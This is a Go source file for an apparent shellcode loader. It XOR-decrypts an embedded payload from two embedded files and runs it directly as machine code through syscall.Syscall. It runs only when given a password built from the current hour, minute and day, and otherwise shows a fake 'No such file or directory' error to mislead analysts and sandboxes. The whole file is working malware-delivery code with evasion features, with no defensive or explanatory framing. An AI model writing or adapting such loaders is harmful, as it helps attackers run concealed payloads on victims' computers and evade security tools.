package main

import (
	_ "embed"
	"fmt"
	"os"
	"strconv"
	"syscall"
	"time"
	"unsafe"
)

var (
	//go:embed "pad1"
	pad1 []byte
	//go:embed "pad2"
	pad2 []byte
)

func main() {
	runflag := false
	t := time.Now()
	hour := t.Hour()
	minute := t.Minute()
	day := t.Day()
	pass := strconv.Itoa(hour) + strconv.Itoa(minute) + strconv.Itoa(day)
	if len(os.Args) < 2 {
		fmt.Printf("No such file or directory")
		os.Exit(0)
	}
	if os.Args[1] == pass {
		runflag = true
	}
	if runflag {
		for index, padByte := range pad1 {
			pad2[index] = pad2[index] ^ padByte
		}
		syscall.Syscall(uintptr(unsafe.Pointer(&pad2[0])), 0, 0, 0, 0)
	} else {
		fmt.Printf("No such file or directory")
	}
}
